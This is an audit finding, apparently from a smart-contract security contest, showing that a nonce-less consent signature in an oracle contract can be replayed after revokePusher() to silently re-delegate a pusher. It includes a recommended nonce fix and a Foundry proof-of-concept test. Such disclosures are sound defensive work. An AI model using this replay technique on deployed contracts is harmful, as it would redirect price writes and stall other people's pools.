### Title
`revokePusher()` is ineffective against EOA-consent signature replay — creator can silently re-delegate a revoked pusher and redirect its price writes into their namespace - (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`allowPushers` accepts an EIP-191 signature that commits to `(chainid, oracle, deadline, pusher, creator)` but contains **no nonce**. After a pusher calls `revokePusher()` to clear `namespaceRemapping[pusher]`, the creator can immediately replay the original, still-valid signature to call `allowPushers` again and re-establish the delegation — without any new consent from the pusher. The code comment in `allowPushers` explicitly claims the deadline prevents this, but the deadline only blocks *expired* signatures; a live signature with a future deadline is freely replayable.

---

### Finding Description

`allowPushers` builds its consent hash as:

```solidity
keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
``` [1](#0-0) 

There is no nonce, no use-once flag, and no on-chain record that the signature was consumed. The function's own NatSpec acknowledges the risk but incorrectly claims the deadline is sufficient:

> "The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it." [2](#0-1) 

`revokePusher()` only zeroes `namespaceRemapping[msg.sender]`:

```solidity
function revokePusher() external {
    address creator = namespaceRemapping[msg.sender];
    if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
    namespaceRemapping[msg.sender] = address(0);
    emit PusherRevoked(msg.sender, creator);
}
``` [3](#0-2) 

It does not invalidate the off-chain signature. The creator retains the original bytes and can call `allowPushers` again at any time before the deadline, atomically re-writing `namespaceRemapping[pusher] = creator`. The pusher's revocation is silently undone.

The `fallback()` push path resolves the namespace at call time:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [4](#0-3) 

So every subsequent push by the re-delegated pusher lands in the creator's namespace, not the pusher's own.

---

### Impact Explanation

A pusher who is also a creator with their own pools (a common pattern — a market-maker runs both the price-push key and the pool) cannot safely revoke a delegation while the original consent signature is still within its deadline window. Any push they make to update their own feeds is silently redirected into the adversarial creator's namespace. Their own feeds receive no update, go stale, and any pool reading those feeds via `price()` will either:

- revert with `FeedStalled` (if the provider enforces `maxTimeDrift`), halting swaps entirely, or
- execute at the last stale price if the drift guard is loose.

This is a **bad-price / broken-pool-functionality** impact: the pusher's own pools receive stale oracle data because their price writes are hijacked into a foreign namespace.

---

### Likelihood Explanation

The trigger requires a creator who holds a valid (non-expired) consent signature and is willing to replay it after the pusher revokes. This is a semi-trusted adversary (the creator is not fully trusted per the contest model). The pusher must have signed a consent with a non-trivial deadline (e.g., 7–30 days, which is operationally normal). The attack is a single on-chain transaction with no cost beyond gas.

---

### Recommendation

Add a per-pusher nonce to the consent hash and increment it on each successful `allowPushers` call (or on `revokePusher`/`removePushers`). This makes every consent single-use:

```diff
+ mapping(address => uint256) public pusherNonce;

  bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
-     keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
+     keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender, pusherNonce[pusher]))
  );
  require(pusher == ECDSA.recover(hash, signatures[i]));
  namespaceRemapping[pusher] = msg.sender;
+ pusherNonce[pusher]++;
```

And in `revokePusher` / `removePushers`, also increment the nonce so any outstanding signature is immediately invalidated:

```diff
  namespaceRemapping[msg.sender] = address(0);
+ pusherNonce[msg.sender]++;
```

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

// Foundry test demonstrating that revokePusher() is bypassable via signature replay.
// Run: forge test --match-test testRevokeBypassedBySignatureReplay -vvv

contract ReplayRevokePoC is Test {
    CompressedOracleV1 oracle;
    uint256 constant PUSHER_KEY = 0xBEEF;
    address pusher;
    address creator = address(0xC0FFEE);

    function setUp() public {
        oracle = new CompressedOracleV1(address(this), 0);
        pusher = vm.addr(PUSHER_KEY);
        vm.warp(1_700_000_000);
    }

    function testRevokeBypassedBySignatureReplay() public {
        uint256 deadline = block.timestamp + 30 days;

        // 1. Pusher signs consent once.
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        // 2. Creator delegates pusher.
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator);

        // 3. Pusher revokes.
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0), "revoked");

        // 4. Creator replays the SAME signature — no new consent from pusher.
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);

        // 5. Pusher is re-delegated without its knowledge.
        assertEq(oracle.namespaceRemapping(pusher), creator, "re-delegated silently");

        // 6. Pusher's next push lands in creator's namespace, not its own.
        uint56 tsMs = uint56(block.timestamp * 1000);
        uint48 raw = (uint48(900_000) << 16) | (uint48(5) << 8) | uint48(0);
        vm.prank(pusher);
        (bool ok,) = address(oracle).call(abi.encodePacked(
            (uint256(tsMs) << 8) | uint256(0) | (uint256(raw) << 208)
        ));
        assertTrue(ok);

        // Creator's namespace has the price; pusher's own namespace is empty → stale.
        assertGt(oracle.getOracleData(oracle.feedIdOf(creator, 0, 0)).price, 0);
        assertEq(oracle.getOracleData(oracle.feedIdOf(pusher,  0, 0)).price, 0,
            "pusher own namespace stale — pools reading it get bad price");
    }
}
```
